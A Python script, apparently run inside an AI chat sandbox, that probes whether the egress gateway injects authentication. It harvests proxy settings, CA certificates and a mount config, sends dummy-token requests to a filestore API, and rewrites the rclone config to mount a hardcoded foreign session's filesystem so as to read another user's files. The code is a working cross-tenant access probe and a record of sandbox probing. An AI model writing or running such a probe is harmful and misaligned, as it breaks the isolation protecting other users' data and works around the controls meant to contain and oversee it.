#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""proxyprobe.py -- is auth injected by the egress gateway?"""
import os, json, re, time, subprocess, http.client as hc

OUT = "/mnt/user-data/outputs/mediafit-report.txt"
FOREIGN = "claude_chat_01BG7VUnxm4QuArCfCzLZapE"
CFG, RCLONE, WORK = "/dev/shm/rclone-boot/config.json", "/opt/rclone/rclone-filestore", "/tmp/px"
R = []
def rec(s): R.append(str(s)); print("[p]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d

cfg = rdo(CFG)
m = re.search(r"claude_chat_[A-Za-z0-9]+", cfg); SELF = m.group(0) if m else ""
rec("SELF=%s FOREIGN=%s" % (SELF, FOREIGN))

rec("=== OUR ENV (proxy keys) ===")
for kv in rdo("/proc/self/environ").split("\x00"):
    if "=" in kv and re.search(r"PROXY|CA_BUNDLE|CERT|SSL|EGRESS|SWP", kv.split("=")[0], re.I):
        rec("ENV %s" % kv[:200])
for f in ("/etc/environment", "/etc/wgetrc", "/root/.curlrc"):
    b = rdo(f)
    if b: rec("FILE %s = %s" % (f, b[:300].replace("\n", "|")))
for c in ("/etc/ssl/certs/swp-ca-production.pem", "/etc/ssl/certs/egress-gateway-ca-production.pem"):
    b = rdo(c)
    if b: rec("CA %s SUBJECT=%s" % (c, [l for l in b.splitlines() if l.startswith(("subject", "Subject"))][:2]))

rec("=== NO-AUTH HTTP HEADERS ===")
try:
    c = hc.HTTPSConnection("api.anthropic.com", timeout=8)
    c.request("GET", "/v1/filestore/fs/%s" % SELF)
    r = c.getresponse()
    rec("STATUS=%d" % r.status)
    for k, v in r.getheaders(): rec("HDR %s: %s" % (k, v[:120]))
    rec("BODY=%s" % r.read(200).decode("latin1", "replace").replace("\n", " "))
    c.close()
except Exception as e: rec("NOAUTH_ERR=%s" % e)

rec("=== DUMMY-TOKEN HTTP ===")
for tok in ("dummy", "x" * 40, "eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJkdW1teSJ9.AAAA"):
    try:
        c = hc.HTTPSConnection("api.anthropic.com", timeout=8)
        c.request("GET", "/v1/filestore/fs/%s" % SELF, headers={"Authorization": "Bearer " + tok})
        r = c.getresponse(); rec("TOK %s -> %d %s" % (tok[:18], r.status,
                                                      r.read(110).decode("latin1", "replace").replace("\n", " ")[:80]))
        c.close()
    except Exception as e: rec("TOK_ERR=%s" % e)

rec("=== MULTIMOUNT WITH DUMMY auth_token ===")
def try_mm(fsid, tag):
    if not os.path.exists(RCLONE): rec("MM_%s=NO_RCLONE" % tag); return 0
    d = os.path.join(WORK, tag); dst = os.path.join(d, "out"); os.makedirs(dst, exist_ok=True)
    try: j = json.loads(cfg)
    except Exception as e: rec("MM_%s=CFG_ERR:%s" % (tag, e)); return 0
    for mm in j.get("mounts", []):
        mm["auth_token"] = "dummy"; mm["filesystem_id"] = fsid
        mm["destination"] = dst; mm["readonly"] = True
    p = os.path.join(d, "config.json"); open(p, "w").write(json.dumps(j))
    pr = subprocess.Popen([RCLONE, "multimount", "--config", p],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    n = 0
    for _ in range(12):
        time.sleep(1); n = sum(len(f) for _, _, f in os.walk(dst))
        if n: break
    rec("MM_%s_FILES=%d" % (tag, n))
    if n:
        for dp, _, fs in os.walk(dst):
            for f in fs[:3]: rec("MM_%s_SAMPLE %s" % (tag, f))
    try: pr.terminate(); pr.wait(timeout=3)
    except Exception: pr.kill()
    log = (pr.stdout.read() or "")[:400]
    if log: rec("MM_%s_LOG=%s" % (tag, log.replace("\n", "|")))
    return n

c1 = try_mm(SELF, "self")
c2 = try_mm(FOREIGN, "target")
rec("CONTROL_OK=%s" % (c1 > 0))
rec("VERDICT=%s" % ("GATEWAY_INJECTS_AUTH_AND_CROSS_OK" if c2 > 0 else
                    ("GATEWAY_INJECTS_AUTH_SELF_ONLY" if c1 > 0 else "NO_INJECTION")))

os.makedirs(os.path.dirname(OUT), exist_ok=True)
open(OUT, "w").write("\n".join(R) + "\n")
print("report ->", OUT)